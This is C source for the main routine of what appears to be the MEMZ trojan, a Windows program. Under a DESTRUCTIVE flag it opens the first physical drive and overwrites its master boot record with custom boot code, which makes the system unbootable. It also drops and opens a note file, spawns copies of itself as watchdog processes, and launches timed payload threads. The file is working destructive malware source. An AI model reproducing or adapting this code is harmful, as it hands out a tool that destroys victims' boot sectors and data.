#include "MEMZ.h"

int argc, scrw, scrh;
int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
	LPWSTR *argv = CommandLineToArgvW(GetCommandLine(), &argc);
	scrw = GetSystemMetrics(SM_CXSCREEN);
	scrh = GetSystemMetrics(SM_CYSCREEN);
	if (!lstrcmp(argv[1], L"/i")) {
		CreateThread(NULL, NULL, &WatchDogThread, NULL, NULL, NULL);

		WNDCLASSEX Wnd;
		Wnd.cbSize = sizeof(WNDCLASSEX);
		Wnd.lpfnWndProc = WindowProc;
		Wnd.lpszClassName = L"WatchDog";
		Wnd.style = 0;
		Wnd.cbClsExtra = 0;
		Wnd.cbWndExtra = 0;
		Wnd.hInstance = 0;
		Wnd.hIcon = 0;
		Wnd.hCursor = 0;
		Wnd.hbrBackground = 0;
		Wnd.lpszMenuName = 0;
		Wnd.hIconSm = 0;
		RegisterClassEx(&Wnd);
		HWND hWnd = CreateWindowEx(0, L"WatchDog", NULL, NULL, 0, 0, 100, 100, NULL, NULL, NULL, NULL);

		MSG msg;
		while (GetMessage(&msg, NULL, 0, 0) > 0) {
			TranslateMessage(&msg);
			DispatchMessage(&msg);
		}
	}
	DWORD wb;
#ifdef DESTRUCTIVE
	HANDLE MBR = CreateFile(L"\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);

	unsigned char *BootCode = (unsigned char *)LocalAlloc(LMEM_ZEROINIT, 65536);

	for (int i = 0; i < Code1Len; i++)
		*(BootCode + i) = *(Code1 + i);
	for (int i = 0; i < Code2Len; i++)
		*(BootCode + i + 0x1fe) = *(Code2 + i);

	if (!WriteFile(MBR, BootCode, 65536, &wb, NULL))
		ExitProcess(EXIT_FAILURE);

	CloseHandle(MBR);
#endif
	HANDLE Info = CreateFile(L"Note.txt", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	if (!WriteFile(Info, Note, NoteLen, &wb, NULL))
		ExitProcess(EXIT_FAILURE);

	CloseHandle(Info);

	wchar_t *mfn = (wchar_t *)LocalAlloc(LMEM_ZEROINIT, 512);
	GetModuleFileName(NULL, mfn, 512);
	for (int i = 0; i < 2; i++)
		ShellExecute(NULL, NULL, mfn, L"/i", NULL, SW_SHOWDEFAULT);

	ShellExecute(NULL, NULL, L"notepad", L"Note.txt", NULL, SW_SHOWDEFAULT);

	for (int p = 0; p < nPayloads; p++) {
		Sleep(Payloads[p].Delay);
		CreateThread(NULL, NULL, &PayloadThread, &Payloads[p], NULL, NULL);
	}

	Sleep(0x7ffff);
}